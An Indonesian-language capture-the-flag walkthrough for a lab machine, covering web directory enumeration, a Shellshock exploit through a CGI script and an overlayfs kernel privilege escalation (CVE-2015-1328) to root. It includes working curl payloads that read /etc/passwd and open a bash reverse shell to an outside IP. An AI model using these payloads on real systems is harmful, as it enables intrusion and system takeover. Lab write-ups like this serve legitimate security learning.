enumerasi menggunakan nmap / rustscan

enumerasi direktori
```bash
301   311B   http://10.10.126.29/admin    -> REDIRECTS TO: http://10.10.126.29/admin/
200     0B   http://10.10.126.29/admin/
200     0B   http://10.10.126.29/admin/index.html
301   312B   http://10.10.126.29/backup    -> REDIRECTS TO: http://10.10.126.29/backup/
200     1KB  http://10.10.126.29/backup/
301   313B   http://10.10.126.29/cgi-bin    -> REDIRECTS TO: http://10.10.126.29/cgi-bin/
403   287B   http://10.10.126.29/cgi-bin/
200    13B   http://10.10.126.29/cgi-bin/test.cgi
301   309B   http://10.10.126.29/css    -> REDIRECTS TO: http://10.10.126.29/css/
301   309B   http://10.10.126.29/img    -> REDIRECTS TO: http://10.10.126.29/img/
200   451B   http://10.10.126.29/js/
200    38B   http://10.10.126.29/robots.txt
301   312B   http://10.10.126.29/secret    -> REDIRECTS TO: http://10.10.126.29/secret/
200    97B   http://10.10.126.29/secret/
403   292B   http://10.10.126.29/server-status
403   293B   http://10.10.126.29/server-status/
301   313B   http://10.10.126.29/uploads    -> REDIRECTS TO: http://10.10.126.29/uploads/
200     0B   http://10.10.126.29/uploads/
```

cgi-bin sepertinya bisa dimanfaatkan untuk [shellshock](https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock).
```
curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd;" http://10.10.126.29/cgi-bin/test.cgi
```
kita dapat memanfaatkannya untuk mendapatkan revshell, namun sebelumnya siapkan listener, selanjutnya gunakan
```
curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.8.15.121/2222 0>&1';" http://10.10.126.29/cgi-bin/test.cgi
```
dan kita mendapat revshell sekaligus bisa langsung membaca flag user di `/home/ryan`.

Namun disini kita masih sebagai www-data, jika kita enumerate dengan linpeas.sh, hal yang paling di highlight adalah kernel version, yaitu 3.13.0-32-generic.
```bash
╔══════════╣ Operative system                                                                             
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                        
Linux version 3.13.0-32-generic (buildd@kissel) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #57-Ubuntu S
MP Tue Jul 15 03:51:08 UTC 2014                                                                           
Distributor ID: Ubuntu                                                                                    
Description:    Ubuntu 14.04.1 LTS
```
vulnerability ini disebut `overlayfs`, dimana linux kernel sebelum 3.19.0-21.21 tidak memeriksa permission untuk file creation dengan baik di upper filesystem directory, yang mana membuat local user bisa mendapatkan akses root dengan leverage konfigurasi dimana overlayfs diizinkan dalam arbitrary mount namespace. (source: [NVD.NIST.GOV](https://nvd.nist.gov/vuln/detail/CVE-2015-1328))

kita dapat menggunakan exploit [ini](https://www.exploit-db.com/exploits/37292), lalu mengirimkannya ke target. Selanjutnya di target, kita bisa compile dengan gcc
```bash
gcc file.c -o privesc && ./privesc
```
namun daripada berhasil, kita malah mendapat error
```bash
gcc: error trying to exec 'cc1': execvp: No such file or directory
```
hal ini terjadi karena `PATH` environment dalam target tidak seperti seharusnya, kita dapat mengubahnya dengan cara
```bash
# sebelum
echo $PATH
/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.

#sesudah
export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin
```
dan kita bisa ulang compilenya lagi, dan kali ini akan berhasil untuk compile serta leverage ke user root. Kita dapat melihat flag root di `/root/root.txt`
